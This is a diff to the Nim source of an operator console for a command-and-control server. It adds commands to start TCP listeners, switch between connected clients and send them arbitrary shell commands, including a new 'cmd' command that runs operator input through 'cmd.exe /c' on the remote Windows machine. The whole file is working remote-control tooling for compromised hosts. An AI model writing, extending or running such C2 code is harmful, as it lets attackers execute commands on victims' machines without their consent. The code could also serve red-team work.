@@ -1,10 +1,13 @@
 import asyncdispatch, asyncnet, threadpool, asyncfutures
 import strutils, terminal
 
+import listeners/[tcp]
+
 import types, logging
 
-proc procStdin*(server: C2Server, clResp: ref Future[void]) {.async.} =
-  var handlingClient: int = -1
+proc procStdin*(server: C2Server) {.async.} =
+  var handlingClientId: int = -1
+  var handlingClient: Client
 
   prompt(handlingClient, server)
   var messageFlowVar = spawn stdin.readLine()
@@ -17,6 +20,18 @@ proc procStdin*(server: C2Server, clResp: ref Future[void]) {.async.} =
       let argsn = len(args)
 
       case cmd:
+        of "listeners":
+            for tcpListener in server.tcpListeners:
+                infoLog $tcpListener
+        of "startlistener":
+            if argsn >= 2:
+                if args[1] == "TCP":
+                    if argsn >= 4:
+                        asyncCheck server.createNewTcpListener(parseInt(args[3]), args[2])
+                    else:
+                        echo "Bad usage, correct usage: startlistener TCP (ip) (port)"
+            else:
+                echo "You need to specify the type of listener you wanna start, supported: TCP"
         of "clients":
             for client in server.clients:
                 if client.connected:
@@ -27,22 +42,28 @@ proc procStdin*(server: C2Server, clResp: ref Future[void]) {.async.} =
         of "switch":
             for client in server.clients:
                 if client.id == parseInt(args[1]):
-                    handlingClient = parseInt(args[1])
-                if handlingClient != parseInt(args[1]):
+                    handlingClientId = parseInt(args[1])
+                    handlingClient = client
+                if handlingClientId != parseInt(args[1]):
                     infoLog "client not found"
         of "info":
-            for client in server.clients:
-                if client.id == handlingClient:
-                    echo @client
+            echo @handlingClient
         of "shell":
-            for client in server.clients:
-                if client.id == handlingClient:
-                    await client.socket.send("CMD:" & args[1..(argsn - 1)].join(" ") & "\r\n")
-                    if clResp[].isNil():
-                        clResp[] = newFuture[void]()
-                    await clResp[]
+            if handlingClient.listenerType == "tcp":
+                let tcpSocket: TCPSocket = getTcpSocket(handlingClient)
+                await tcpSocket.socket.send("CMD:" & args[1..(argsn - 1)].join(" ") & "\r\n")
+                if server.clRespFuture[].isNil():
+                    server.clRespFuture[] = newFuture[void]()
+                await server.clRespFuture[]
+        of "cmd":
+            if handlingClient.listenerType == "tcp":
+                let tcpSocket: TCPSocket = getTcpSocket(handlingClient)
+                await tcpSocket.socket.send("CMD:cmd.exe /c " & args[1..(argsn - 1)].join(" ") & "\r\n")
+                if server.clRespFuture[].isNil():
+                    server.clRespFuture[] = newFuture[void]()
+                await server.clRespFuture[]
         of "back": 
-            handlingClient = -1
+            handlingClientId = -1
         of "exit":
             quit(0)
 
